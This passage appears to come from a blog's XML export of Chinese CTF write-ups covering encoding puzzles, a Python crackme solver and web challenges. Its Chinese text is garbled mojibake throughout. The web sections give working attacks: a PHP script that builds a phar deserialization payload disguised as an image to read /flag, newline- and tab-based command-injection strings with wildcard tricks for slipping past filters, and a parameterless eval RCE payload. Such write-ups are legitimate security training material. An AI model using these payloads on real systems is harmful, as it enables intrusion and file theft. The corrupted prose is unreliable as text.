alt="image-20220930164834081"><br>666C61677B4A7573745F65617379217DD<br>TEdDVEYlN0JkR2hwYzE5cGMxOWhYM2R5YjI1blgyWnNZV2NsTWpFJTNEJTdE<br>ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œç¬¬ä¸€ä¸ªæ˜¾ç„¶æ˜¯16è¿›åˆ¶ï¼Œç›´æ¥ç™¾åº¦ä¸€ä¸ªè½¬ä¸€ä¸‹<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930165049824.png" alt="image-20220930165049824"><br><code>flag&#123;Just_easy!&#125;</code><br>è¿™ä¸ªå­—ç¬¦ä¸²è§£å‡ºæ¥æ˜¯ä¸ªå‡çš„ æœ‰å…´è¶£çš„åŒå­¦è§£ä¸€ä¸‹</p><h3 id="æœªçŸ¥çš„ç¼–ç "><a href="#æœªçŸ¥çš„ç¼–ç " class="headerlink" title="æœªçŸ¥çš„ç¼–ç "></a>æœªçŸ¥çš„ç¼–ç </h3><p>Â <code>å‚è€ƒä»£ç å¦‚ä¸‹ï¼š&lt;div style=&quot;background-image:url(javascript:eval(String.fromCharCode(%66%6C%61%67%7B%64%34%38%65%31%61%34%64%2D%30%34%63%64%2D%34%62%36%34%2D%38%36%65%39%2D%37%37%66%38%66%35%31%32%39%36%30%35%7D)))&quot;&gt; </code><br>ascllä½ çŸ¥é“æ€ä¹ˆè§£å—ï¼Ÿ<br>ç­¾åˆ°é¢˜ï¼Œurlè§£ä¸€ä¸‹å°±å¯ä»¥äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930165704813.png" alt="image-20220930165704813"></p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>ä¸ä¼šï¼Œç›´æ¥ç™¾åº¦<br>å‚è€ƒ<code>https://www.jianshu.com/p/7779f3e83384</code></p><h3 id="pyé€†å‘"><a href="#pyé€†å‘" class="headerlink" title="pyé€†å‘"></a>pyé€†å‘</h3><p>ä¸æ˜¯æˆ‘åšçš„ï¼Œå®‡å“¥åšçš„ï¼Œæˆ‘ä¸ä¼š<br>å‚è€ƒå®‡å“¥çš„wp<br>é¢˜ç›®ç»™å‡ºæºç   ç›´æ¥ç™¾åº¦å…³é”®ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">key, seed, string</span>):</span></span><br><span class="line">    rst = []</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> string:</span><br><span class="line">        rst.append((<span class="built_in">ord</span>(v) + seed ^ <span class="built_in">ord</span>(key[seed])) % <span class="number">255</span>)</span><br><span class="line">        seed = (seed + <span class="number">1</span>) % <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Welcome to python crackme&quot;</span>)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    KEY1 = <span class="string">&quot;Maybe you are good at decryptint Byte Code, have a try!&quot;</span></span><br><span class="line">    KEY2 = [</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">28</span>,</span><br><span class="line">        <span class="number">120</span>,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        <span class="number">37</span>,</span><br><span class="line">        <span class="number">62</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>,</span><br><span class="line">        <span class="number">46</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">    ]</span><br><span class="line">    en_out = encrypt(KEY1, <span class="number">5</span>, flag)</span><br><span class="line">    <span class="keyword">if</span> KEY2 == en_out:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;You Win,FLAG IS flag&#123;%s&#125;&quot;</span> % flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try Again !&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ›¿æ¢key2å°±è¡Œäº†<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_each</span>(<span class="params">key, seed, KEY2</span>):</span></span><br><span class="line">    answer = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> KEY2:</span><br><span class="line">        password = each</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            result = (i + seed ^ <span class="built_in">ord</span>(key[seed])) % <span class="number">255</span></span><br><span class="line">            <span class="keyword">if</span> password == result:</span><br><span class="line">                answer += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        seed = (seed + <span class="number">1</span>) % <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    KEY1 = <span class="string">&quot;Maybe you are good at decryptint Byte Code, have a try!&quot;</span></span><br><span class="line">    KEY2 = [</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">28</span>,</span><br><span class="line">        <span class="number">120</span>,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        <span class="number">37</span>,</span><br><span class="line">        <span class="number">62</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>,</span><br><span class="line">        <span class="number">46</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">    ]</span><br><span class="line">    answer = decrypt_each(KEY1, <span class="number">5</span>, KEY2)</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br><span class="line"><span class="comment">#å¾—åˆ°ï¼š</span></span><br><span class="line"><span class="comment">#JGpaOILOVEPYTHONSOMUCHK</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤é¢˜å‚è€ƒ<code>https://l1nwatch.gitbook.io/ctf/idf-shi-yan-shi/reverse-dao-hang-ni-shi/python-bytecode</code></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="unsortheap"><a href="#unsortheap" class="headerlink" title="unsortheap"></a>unsortheap</h3><p>ä¸ä¼š</p><h3 id="myhouse"><a href="#myhouse" class="headerlink" title="myhouse"></a>myhouse</h3><p>ä¸ä¼š</p><blockquote><p>è¿™æ¬¡çš„é¢˜éƒ½èƒ½æœåˆ°ï¼Œä¹Ÿæ²¡å•¥å¥½è¯´çš„ï¼Œå¤ªèœäº†,webä¹Ÿæ²¡å•¥æ„æ€<br>æ„Ÿè°¢æˆ‘çš„å°ä¼™ä¼´ä¸¤å°æ—¶çš„åŠªåŠ›ï¼Œå¾ˆå¼ºäº†<br>å®‡å“¥å¤ªå¼ºäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> å¸‚èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022ç¬¬äº”ç©ºé—´éƒ¨åˆ†wp</title>
      <link href="/2022/09/20/CTFS/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/09/20/CTFS/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h3 id="5-ç®€å•çš„Base"><a href="#5-ç®€å•çš„Base" class="headerlink" title="5_ç®€å•çš„Base"></a>5_ç®€å•çš„Base</h3><p>åå…­è¿›åˆ¶è½¬ä¸€ä¸‹å­—ç¬¦ä¸²å³å¯</p><p>666c61677b57656c636f6d655f686572657d</p><p>flag{Welcome_here}</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h3 id="5-web-BaliYun"><a href="#5-web-BaliYun" class="headerlink" title="5_web_BaliYun"></a>5_web_BaliYun</h3><p>è€ƒç‚¹ï¼špharååºåˆ—åŒ–</p><p>ç»è¿‡ç›®å½•æ‰«æå‘ç°  <code>www.zip</code></p><blockquote><p>index.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="variable">$down</span> = <span class="keyword">new</span> check_img();</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$down</span>-&gt;img_check();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                        <span class="variable">$up</span> = <span class="keyword">new</span> upload();</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$up</span>-&gt;start();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>class.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = end(explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!in_array(<span class="keyword">$this</span>-&gt;ext, <span class="keyword">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>public function __wakeup(){<br>        echo file_get_contents($this-&gt;filename);<br>    }</p><p>å› ä¸ºè¿™é‡Œå­˜åœ¨wakeupå‡½æ•°ï¼Œä½†æ˜¯åˆä¸å­˜åœ¨ååºåˆ—åŒ–çš„ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨pharååºåˆ—åŒ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬ä¸€èˆ¬åˆ©ç”¨ååºåˆ—æ¼æ´ï¼Œä¸€èˆ¬éƒ½æ˜¯å€ŸåŠ©unserialize()å‡½æ•°ï¼Œä¸è¿‡éšç€äººä»¬å®‰å…¨çš„æ„è¯†çš„æé«˜è¿™ç§æ¼æ´åˆ©ç”¨è¶Šæ¥è¶Šæ¥éš¾äº†ï¼Œä½†æ˜¯åœ¨2020å¹´8æœˆä»½çš„Blackhat2018å¤§ä¼šä¸Šï¼Œæ¥è‡ªSecarmaçš„å®‰å…¨ç ”ç©¶å‘˜Sam Thomasè®²è¿°äº†ä¸€ç§æ”»å‡»PHPåº”ç”¨çš„æ–°æ–¹å¼ï¼Œåˆ©ç”¨è¿™ç§æ–¹æ³•å¯ä»¥åœ¨ä¸ä½¿ç”¨unserialize()å‡½æ•°çš„æƒ…å†µä¸‹è§¦å‘PHPååºåˆ—åŒ–æ¼æ´ã€‚æ¼æ´è§¦å‘æ˜¯åˆ©ç”¨Phar:// ä¼ªåè®®è¯»å–pharæ–‡ä»¶æ—¶ï¼Œä¼šååºåˆ—åŒ–meta-dataå‚¨å­˜çš„ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag&quot;</span>; <span class="comment">//è¦è¯»å–çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> upload();</span><br><span class="line">@unlink(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;shell.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œæ­¤æ–‡ä»¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ªshell.pharæ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬å°†shell.pharï¼Œæ”¹ä¸ºjpgæ–‡ä»¶ä¸Šä¼ ä¸Šå»ï¼Œ<br>è·¯å¾„ä¸º  upload/shell.jpg</p><p>å€ŸåŠ©<code>phar://</code>æ‰§è¡Œä»£ç <br><code>img_name=phar://upload_file/phar.gif</code></p><h3 id="5-web-letmeguess-1"><a href="#5-web-letmeguess-1" class="headerlink" title="5_web_letmeguess_1"></a>5_web_letmeguess_1</h3><p>è€ƒç‚¹ï¼šå¼±å£ä»¤ï¼Œrceï¼Œè¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦/)ã€ ç©ºæ ¼</p><p>çˆ†ç ´ä¸€ä¸‹  adminï¼Œadmin123<br>è¿‡æ»¤çš„åˆ†éš”ç¬¦<code>linuxä¸­ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦ï¼š%0a ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||</code><br>è¿‡æ»¤çš„ç©ºæ ¼ï¼Œå¯ä»¥ç”¨<code>%09(tab)ã€%09ã€ $&#123;IFS&#125;ã€$IFSã€$IFS$1ã€$&#123;IFS&#125;$ã€&lt;ã€&lt;&gt;è¿™äº›éƒ½å¯ä»¥å½“åšç©ºæ ¼ç¬¦ä½œä¸ºä»£æ›¿ã€‚</code><br>è¿‡æ»¤äº†catï¼Œå¯ä»¥ç”¨ <code>nlï¼Œnlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·</code><br><code>ip=%0anl%09index.php</code><br>å¯ä»¥è¯»å–æºç ï¼Œå¤ªé•¿ï¼Œè´´ä¸€ä¸‹å…³é”®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|touch|more|curl|scp|kylin|echo|tmp|var|run|find|grep|-|`|&#x27;|:|&lt;|&gt;|less|more)/&quot;, $ip, $m)) </span><br></pre></td></tr></table></figure><p><code>ip=%0als</code>  lsçš„æ—¶å€™æœ‰ä¸€ä¸ªkylinç›®å½•ï¼Œç›®å½•ä¸‹æœ‰ä¸€ä¸ªflag.txt ï¼Œä½†æ˜¯ä¸èƒ½è®¿é—®<br>ä¸”kylinï¼Œflagéƒ½è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬ç”¨é—®å·æ›¿æ¢å…¶ä¸­ä¸€ä¸ªå­—ç¬¦å³å¯<br>ç»•è¿‡ç›®å½•åˆ†éš”ç¬¦çš„è¯ï¼Œå…ˆcd åˆ°è¿™ä¸ªç›®å½•ï¼Œå†å»catå³å¯</p><p><code>/?ip=%0acd%09ky?in%0anl%09f?ag.txt</code><br>è§£æ³•ä¸å”¯ä¸€</p><blockquote><p>å‚è€ƒ pharååºåˆ—åŒ–<br><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p></blockquote><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> ç¬¬äº”ç©ºé—´ </tag>
            
            <tag> pharååºåˆ—åŒ–ï¼Œrce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cqgamectf-1</title>
      <link href="/2022/05/07/CTFS/cqgamectf-1/"/>
      <url>/2022/05/07/CTFS/cqgamectf-1/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z_]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;What are you thinking?&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Please calm down&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=show_source(end(scandir(chr(ceil(sinh(cosh(tan(ceil(tan(ceil(zend_version())))))))))));</span><br></pre></td></tr></table></figure><p><img src="/images/cqgamectf-1/1.png" alt="image-20220402164521180"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ— å‚æ•°rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
